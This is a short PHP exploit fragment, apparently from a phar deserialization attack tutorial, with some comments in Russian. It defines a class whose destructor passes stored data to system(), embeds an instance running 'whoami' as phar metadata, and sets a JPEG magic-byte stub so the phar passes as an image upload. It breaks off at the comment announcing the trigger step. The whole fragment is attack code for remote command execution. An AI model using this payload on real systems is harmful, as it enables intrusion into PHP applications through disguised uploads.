// add object of any class as meta data
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();

// замаскировать phar под JPG: магические байты \xff\xd8\xff
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
// затем триггер:
